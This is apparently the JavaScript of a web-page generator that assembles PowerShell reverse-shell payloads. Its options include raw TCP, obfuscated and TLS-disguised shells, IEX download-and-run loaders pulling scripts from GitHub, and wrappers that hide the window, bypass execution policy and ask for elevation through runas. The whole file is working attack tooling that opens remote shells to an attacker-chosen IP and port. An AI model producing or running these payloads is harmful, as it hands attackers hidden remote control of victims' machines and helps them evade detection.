let results = document.getElementById("results");

const wrap = text => `powershell -w hidden -exec bypass "${text}"`;
const debugwrap = text => `powershell -noexit "${text}"`;
const admin = (script) => `powershell -w hidden -exec bypass  "start -v runas -window hidden powershell '${script.replace(/'/g, `''`)}'"`;

const custom = (url) => `IEX (New-Object Net.WebClient).DownloadString('${url}')`;
const powercat = (ip, port, command) => `IEX (IWR https://raw.githubusercontent.com/discapes/reverse-powershell/master/epiclion.ps1 -UseBasicParsing); epiclion -c ${ip} -p ${port} -e ${command}`;
const powercat2 = (ip, port, command) => `IEX (IWR https://raw.githubusercontent.com/discapes/reverse-powershell/master/pwrct.ps1 -UseBasicParsing); Main @('${ip}',$False,${port},60) @('${command}')`;
const minimal = (ip, port) => `$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
const minimalObf = (ip, port) => `Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('${ip}',${port}));Set-Variable -Name stream -Value ($client.GetStream());[byte[]]$bytes = 0..65535|%{0};while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){;Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));Set-Variable -Name sendback -Value (iex $data 2>&1 | Out-String );Set-Variable -Name sendback2 -Value ($sendback + 'PS ' + (pwd).Path + '> ');Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
// https://github.com/danielbohannon/Invoke-Obfuscation AssignmentStatementAst
const minimal2 = (ip, port) => `$TCPClient=New-Object Net.Sockets.TCPClient('${ip}',${port});$NetworkStream=$TCPClient.GetStream();$StreamWriter=New-Object IO.StreamWriter($NetworkStream);function WriteToStream($String){[byte[]]$script:Buffer=0..$TCPClient.ReceiveBufferSize|%{0};$StreamWriter.Write($String+[System.Security.Principal.WindowsIdentity]::GetCurrent().Name+' - '+(pwd)+' > ');$StreamWriter.Flush()}WriteToStream'';while(($BytesRead=$NetworkStream.Read($Buffer,0,$Buffer.Length)) -gt 0){$Command=([text.encoding]::UTF8).GetString($Buffer, 0,$BytesRead-1);$Output=try{Invoke-Expression $Command 2>&1|Out-String}catch{$_|Out-String}WriteToStream($Output)}$StreamWriter.Close()`;
const minimalssl = (ip, port) => `$TCPClient=New-Object Net.Sockets.TCPClient('${ip}',${port});$NetworkStream=$TCPClient.GetStream();$SslStream=New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned){$SslStream.Close();exit}$StreamWriter=New-Object IO.StreamWriter($SslStream);function WriteToStream($String){[byte[]]$script:Buffer=0..$TCPClient.ReceiveBufferSize|%{0};$StreamWriter.Write($String+[System.Security.Principal.WindowsIdentity]::GetCurrent().Name+' - '+(pwd)+' > ');$StreamWriter.Flush()};WriteToStream'';while(($BytesRead=$SslStream.Read($Buffer,0,$Buffer.Length)) -gt 0){$Command=([text.encoding]::UTF8).GetString($Buffer,0,$BytesRead-1);$Output=try{Invoke-Expression $Command 2>&1|Out-String}catch{$_|Out-String}WriteToStream($Output)}$StreamWriter.Close()`;

function generate() {
    let wrapperType = document.querySelector('input[name="wrapper"]:checked').value;
    let scriptType = document.querySelector('input[name="script"]:checked').value;
    let ip = document.getElementById("ip").value;
    let port = document.getElementById("port").value;
    let command = document.getElementById("command").value;
    let url = document.getElementById("url").value;
    let dashg = document.getElementById("dashg").checked;

    let script;

    switch (scriptType) {
        case "custom":
            script = custom(url);
            break;
        case "powercat":
            script = dashg ? powercat2(ip, port, command) : powercat(ip, port, command);
            break;
        case "minimal":
            script = minimalObf(ip, port);
            break;
        case "minimal2":
            script = minimal2(ip, port);
            break;
        case "minimalssl":
            script = minimalssl(ip, port);
            break;
    }
    switch (wrapperType) {
        case "nowrapper":
            results.value = script;
            break;
        case "wrapper":
            results.value = wrap(script);
            break;
        case "debugwrapper":
            results.value = debugwrap(script);
            break;
        case "admin":
            results.value = admin(script);
            break;
    }
}